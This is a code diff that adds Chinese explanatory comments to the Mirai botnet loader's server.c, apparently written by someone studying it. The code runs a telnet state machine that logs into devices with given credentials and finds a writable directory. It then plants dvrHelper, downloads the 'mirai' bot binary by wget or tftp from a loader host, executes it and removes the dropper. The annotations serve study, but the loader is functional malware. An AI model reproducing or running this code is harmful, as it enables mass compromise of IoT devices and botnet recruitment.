@@ -16,6 +16,7 @@
 #include "headers/binary.h"
 #include "headers/util.h"
 
+//创建线程
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
 {
     struct server *srv = calloc(1, sizeof (struct server));
@@ -51,7 +52,7 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
         pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
     }
 
-    // Create worker threads
+    // Create worker threads　　　有多少个cpu就创建多少个线程
     for (i = 0; i < threads; i++)
     {
         struct server_worker *wrker = &srv->workers[i];
@@ -86,6 +87,8 @@ void server_destroy(struct server *srv)
     free(srv);
 }
 
+
+//判断能否处理新的感染节点
 void server_queue_telnet(struct server *srv, struct telnet_info *info)
 {
     while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)
@@ -100,6 +103,7 @@ void server_queue_telnet(struct server *srv, struct telnet_info *info)
     server_telnet_probe(srv, info);
 }
 
+//处理新节点，添加新节点
 void server_telnet_probe(struct server *srv, struct telnet_info *info)
 {
     int fd = util_socket_and_bind(srv);
@@ -148,10 +152,11 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     }
 
     event.data.fd = fd;
-    event.events = EPOLLOUT;
-    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
+    event.events = EPOLLOUT;//EPOLLOUT
+    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);//监听新节点上的写事件
 }
 
+//线程与cpu核的绑定  多核多线程中一般会使用到
 static void bind_core(int core)
 {
     pthread_t tid = pthread_self();
@@ -162,25 +167,29 @@ static void bind_core(int core)
         printf("Failed to bind to core %d\n", core);
 }
 
+
+//创建的worker线程　　　　如果是多核，那么有多个线程同时在监听事件，当一个事件到来时，多个线程之间如何竞争呢？？？
 static void *worker(void *arg)
 {
     struct server_worker *wrker = (struct server_worker *)arg;
     struct epoll_event events[128];
 
-    bind_core(wrker->thread_id);
+    bind_core(wrker->thread_id);//将该线程与一个cpu绑定
 
     while (TRUE)
     {
-        int i, n = epoll_wait(wrker->efd, events, 127, -1);
+        int i, n = epoll_wait(wrker->efd, events, 127, -1);//worker线程监听事件
 
         if (n == -1)
             perror("epoll_wait");
 
         for (i = 0; i < n; i++)
-            handle_event(wrker, &events[i]);
+            handle_event(wrker, &events[i]);//处理所有的事件
     }
 }
 
+
+//内部是一个状态机
 static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 {
     struct connection *conn = wrker->srv->estab_conns[ev->data.fd];
@@ -230,8 +239,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #endif
         event.data.fd = conn->fd;
         event.events = EPOLLIN | EPOLLET;
-        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);
-        conn->state_telnet = TELNET_READ_IACS;
+        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);//epoll改为　监听读事件和边沿触发模式
+        conn->state_telnet = TELNET_READ_IACS;//状态改变
         conn->timeout = 30;
     }
 
@@ -248,6 +257,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         conn->last_recv = time(NULL);
         while (TRUE)
         {
+            //接收telnet返回的数据，存到conn->rdbuf中。
             ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
             if (ret <= 0)
             {
@@ -273,41 +283,41 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 				abort();
 			}
 
-            while (TRUE)
+            while (TRUE)//状态机　　　感觉这里用while没有必要。。　　一个状态变成另一个状态，consume一直会返回０,因为要等待上面的recv函数接收telnet的数据。
             {
                 int consumed;
 
                 switch (conn->state_telnet)
                 {
                     case TELNET_READ_IACS:
-                        consumed = connection_consume_iacs(conn);
+                        consumed = connection_consume_iacs(conn);//是否顺利建立连接
                         if (consumed)
                             conn->state_telnet = TELNET_USER_PROMPT;
                         break;
                     case TELNET_USER_PROMPT:
-                        consumed = connection_consume_login_prompt(conn);
+                        consumed = connection_consume_login_prompt(conn);//是否收到login提示信息
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.user);
+                            util_sockprintf(conn->fd, "%s", conn->info.user);//输入用户名
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_PASS_PROMPT;
                         }
                         break;
                     case TELNET_PASS_PROMPT:
-                        consumed = connection_consume_password_prompt(conn);
+                        consumed = connection_consume_password_prompt(conn);//是否收到password提示信息
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.pass);
+                            util_sockprintf(conn->fd, "%s", conn->info.pass);//输入密码
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                         }
                         break;
-                    case TELNET_WAITPASS_PROMPT:
+                    case TELNET_WAITPASS_PROMPT://是否收到一些打印信息
                         if ((consumed = connection_consume_prompt(conn)) > 0)
                         {
-                            util_sockprintf(conn->fd, "enable\r\n");
+                            util_sockprintf(conn->fd, "enable\r\n");//enable shell sh ????????
                             util_sockprintf(conn->fd, "shell\r\n");
                             util_sockprintf(conn->fd, "sh\r\n");
                             conn->state_telnet = TELNET_CHECK_LOGIN;
@@ -316,11 +326,11 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                     case TELNET_CHECK_LOGIN:
                         if ((consumed = connection_consume_prompt(conn)) > 0)
                         {
-                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");  ///bin/busybox ECCHI
                             conn->state_telnet = TELNET_VERIFY_LOGIN;
                         }
                         break;
-                    case TELNET_VERIFY_LOGIN:
+                    case TELNET_VERIFY_LOGIN://验证是否登录成功
                         consumed = connection_consume_verify_login(conn);
                         if (consumed)
                         {
@@ -328,37 +338,38 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Succesfully logged in\n", ev->data.fd);
 #endif
-                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
+                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");//执行ps命令
                             conn->state_telnet = TELNET_PARSE_PS;
                         }
                         break;
-                    case TELNET_PARSE_PS:
+                    case TELNET_PARSE_PS://根据ps返回结果kill某些进程　　　确认是否可以执行busybox命令
                         if ((consumed = connection_consume_psoutput(conn)) > 0)
                         {
                             util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_PARSE_MOUNTS;
                         }
                         break;
-                    case TELNET_PARSE_MOUNTS:
+                    case TELNET_PARSE_MOUNTS://根据mounts返回结果切换到可写目录
                         consumed = connection_consume_mounts(conn);
                         if (consumed)
                             conn->state_telnet = TELNET_READ_WRITEABLE;
                         break;
-                    case TELNET_READ_WRITEABLE:
+                    case TELNET_READ_WRITEABLE://如果发现可用于读写的文件目录，进入该目录并将/bin/echo拷贝到该目录，文件更名为dvrHelpler，并开启所有用户的读写执行权限。
                         consumed = connection_consume_written_dirs(conn);
                         if (consumed)
                         {
 #ifdef DEBUG
                             printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
 #endif
-                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
+                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);//进入该可写的目录
+                            //将/bin/echo拷贝进该目录，更名为dvrHelper,改变权限
                             util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_COPY_ECHO;
                             conn->timeout = 120;
                         }
                         break;
-                    case TELNET_COPY_ECHO:
-                        consumed = connection_consume_copy_op(conn);
+                    case TELNET_COPY_ECHO://获取系统架构
+                        consumed = connection_consume_copy_op(conn);//判断copy操作是否完成
                         if (consumed)
                         {
 #ifdef DEBUG
@@ -380,37 +391,37 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             }
                         }
                         break;
-                    case TELNET_DETECT_ARCH:
+                    case TELNET_DETECT_ARCH://根据/bin/echo文件来判断系统体系架构
                         consumed = connection_consume_arch(conn);
                         if (consumed)
                         {
                             conn->timeout = 15;
-                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
+                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)//没有此类体系架构的bin文件
                             {
 #ifdef DEBUG
                                 printf("[FD%d] Cannot determine architecture\n", conn->fd);
 #endif
                                 connection_close(conn);
                             }
-                            else if (strcmp(conn->info.arch, "arm") == 0)
+                            else if (strcmp(conn->info.arch, "arm") == 0)//arm架构,arm架构复杂一些，有arm和arm7之分
                             {
 #ifdef DEBUG
                                 printf("[FD%d] Determining ARM sub-type\n", conn->fd);
 #endif
-                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");
+                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");//cpuinfo查看cpu架构
                                 conn->state_telnet = TELNET_ARM_SUBTYPE;
                             }
-                            else
+                            else//非arm架构
                             {
 #ifdef DEBUG
                                 printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
 #endif
-                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");//给对方发送wget;tftp，然后检查响应
                                 conn->state_telnet = TELNET_UPLOAD_METHODS;
                             }
                         }
                         break;
-                    case TELNET_ARM_SUBTYPE:
+                    case TELNET_ARM_SUBTYPE://arm架构某种子架构　　　感觉确实没必要啊
                         if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                         {
                             struct binary *bin = binary_get_by_arch(conn->info.arch);
@@ -422,13 +433,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #endif
                             }
                             else
-                                conn->bin = bin;
+                                conn->bin = bin;//armv7
 
                             util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_UPLOAD_METHODS;
                         }
                         break;
-                    case TELNET_UPLOAD_METHODS:
+                    case TELNET_UPLOAD_METHODS://判断采用哪种方式上传payload
                         consumed = connection_consume_upload_methods(conn);
 
                         if (consumed)
@@ -449,6 +460,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_WGET:
                                     conn->state_telnet = TELNET_UPLOAD_WGET;
                                     conn->timeout = 120;
+                                    //wget http:ip:port/bins/mirai.arm -O - > dvrHelper; chmod 777 dvrHelper;
                                     util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                     wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
 #ifdef DEBUG
@@ -467,7 +479,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             }
                         }
                         break;
-                    case TELNET_UPLOAD_ECHO:   
+                    case TELNET_UPLOAD_ECHO:   //结束上传，通过telnet远程执行上传的bot
                         consumed = connection_upload_echo(conn);
                         if (consumed)
                         {
@@ -480,8 +492,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             ATOMIC_INC(&wrker->srv->total_echoes);
                         }
                         break;
-                    case TELNET_UPLOAD_WGET:
-                        consumed = connection_upload_wget(conn);
+                    case TELNET_UPLOAD_WGET://wget方式执行
+                        consumed = connection_upload_wget(conn);//查看TOKEN_QUERY有没有执行
                         if (consumed)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
@@ -489,12 +501,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Finished wget loading\n", conn->fd);
 #endif
+                            //   ./dvrHelpler telnet.arm     啥意思？？
                             util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_wgets);
                         }
                         break;
-                    case TELNET_UPLOAD_TFTP:
-                        consumed = connection_upload_tftp(conn);
+                    case TELNET_UPLOAD_TFTP://tftp方式执行
+                        consumed = connection_upload_tftp(conn);//查看TOKEN_QUERY有没有执行
                         if (consumed > 0)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
@@ -505,21 +518,21 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_tftps);
                         }
-                        else if (consumed < -1) // Did not have permission to TFTP
+                        else if (consumed < -1) // Did not have permission to TFTP　　没有权限
                         {
 #ifdef DEBUG
                             printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
 #endif
                             consumed *= -1;
-                            conn->state_telnet = TELNET_UPLOAD_ECHO;
+                            conn->state_telnet = TELNET_UPLOAD_ECHO;//如果tftp没有权限，则采用echo方式重新上传程序并执行
                             conn->info.upload_method = UPLOAD_ECHO;
 
                             conn->timeout = 30;
                             util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                         }
                         break;
-                    case TELNET_RUN_BINARY:
-                        if ((consumed = connection_verify_payload(conn)) > 0)
+                    case TELNET_RUN_BINARY://远程删除bot程序
+                        if ((consumed = connection_verify_payload(conn)) > 0)//检查是否已经成功执行bot程序
                         {
                             if (consumed >= 255)
                             {
@@ -534,18 +547,18 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                                 printf("[FD%d] Failed to execute payload\n", conn->fd);
 #endif
-                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
+                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)//可能是arm体系架构各个版本不兼容，导致执行不成功
                                 {
                                     conn->echo_load_pos = 0;
                                     strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                     conn->bin = binary_get_by_arch(conn->info.arch);
                                     util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                     conn->state_telnet = TELNET_UPLOAD_METHODS;
-                                    conn->retry_bin = TRUE;
+                                    conn->retry_bin = TRUE;//重新upload
                                     break;
                                 }
                             }
-#ifndef DEBUG
+#ifndef DEBUG               //rm -rf upnp; > dvrHelper ; 
                             util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
 #else
                             util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
@@ -555,7 +568,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_CLEANUP:
-                        if ((consumed = connection_consume_cleanup(conn)) > 0)
+                        if ((consumed = connection_consume_cleanup(conn)) > 0)//删除bot程序成功，断开连接
                         {
                             int tfd = conn->fd;
 
@@ -564,12 +577,12 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             printf("[FD%d] Cleaned up files\n", tfd);
 #endif
                         }
-                    default:
+                    default://至此状态机结束
                         consumed = 0;
                         break;
                 }
 
-                if (consumed == 0) // We didn't consume any data
+                if (consumed == 0) // We didn't consume any data　　只要有一个consume函数没有成功，则退出循环
                     break;
                 else
                 {
@@ -584,7 +597,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                     conn->rdbuf[conn->rdbuf_pos] = 0;
                 }
 
-                if (conn->rdbuf_pos > 8196)
+                if (conn->rdbuf_pos > 8196)//从telnet返回的数据超过缓存
                 {
                     printf("oversized buffer! 2\n");
                     abort();
@@ -594,6 +607,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
     }
 }
 
+
+//超时线程
 static void *timeout_thread(void *arg)
 {
     struct server *srv = (struct server *)arg;
